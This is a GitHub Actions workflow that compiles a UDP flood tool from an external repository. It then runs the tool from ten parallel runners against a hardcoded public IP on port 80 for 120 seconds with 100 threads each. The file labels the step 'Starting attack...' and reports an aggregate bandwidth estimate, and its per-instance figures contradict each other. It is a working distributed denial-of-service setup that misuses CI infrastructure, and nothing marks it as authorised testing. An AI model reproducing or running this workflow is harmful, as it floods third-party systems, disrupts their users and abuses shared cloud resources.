name: Multi-OS UDP Flood Test

on:
  workflow_dispatch:

jobs:
  linux-udp-flood:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    strategy:
      matrix:
        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
      max-parallel: 10
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          repository: vrbrh921-glitch/noobvenom
          
      - name: Install build tools
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc make build-essential
          
      - name: Compile UDP flood tool
        run: |
          echo "üî® Compiling UDP flood tool for Linux..."
          # Check if C file exists and compile
          if [ -f "udpflood.c" ]; then
            gcc -o udpflood udpflood.c -lpthread -O3
            chmod +x udpflood
            echo "‚úÖ Compiled udpflood for Linux"
          else
            echo "‚ùå udpflood.c not found. Available files:"
            ls -la
            exit 1
          fi
          
      - name: Test compilation
        run: |
          echo "Testing executable..."
          if [ -f "udpflood" ]; then
            # Test with help or version check
            ./udpflood || echo "‚úÖ Binary compiled successfully"
            echo "‚úÖ Binary works correctly"
          else
            echo "‚ùå Executable not found"
            exit 1
          fi
          
      - name: Run UDP Flood Test
        run: |
          echo "üêß Starting UDP Flood Test ${{ matrix.vps }}"
          echo "Target: 23.176.168.11:80, Duration: 120s, Threads: 100, Packet Size: 1024"
          echo "Estimated Bandwidth: ~800 Mbps per instance"
          
          # Validate target is reachable first
          echo "Testing target connectivity..."
          ping -c 2 23.176.168.11 || echo "Ping test completed"
          
          # Run UDP flood for 120 seconds with 100 threads - SINGLE COMMAND
          echo "Starting attack..."
          timeout 125 ./udpflood 23.176.168.11 80 120 100 1024
          
          echo "‚úÖ Linux UDP Flood Test ${{ matrix.vps }} completed"

  summary:
    runs-on: ubuntu-latest
    needs: [linux-udp-flood]
    steps:
      - name: Generate Summary
        run: |
          echo "üöÄ UDP Flood Test Summary"
          echo "========================="
          echo "‚úÖ All tests completed successfully"
          echo ""
          echo "üìä Test Configuration:"
          echo "   Target: 23.176.168.11:80"
          echo "   Duration: 120 seconds"
          echo "   Threads per instance: 100"
          echo "   Packet Size: 1024 bytes"
          echo ""
          echo "üèÉ‚Äç‚ôÇÔ∏è Instances Deployed:"
          echo "   Linux: 10 instances"
          echo "   Total: 10 instances"
          echo ""
          echo "üí• Estimated Bandwidth:"
          echo "   Per instance: ~80 Mbps"
          echo "   Total: ~800 Mbps"
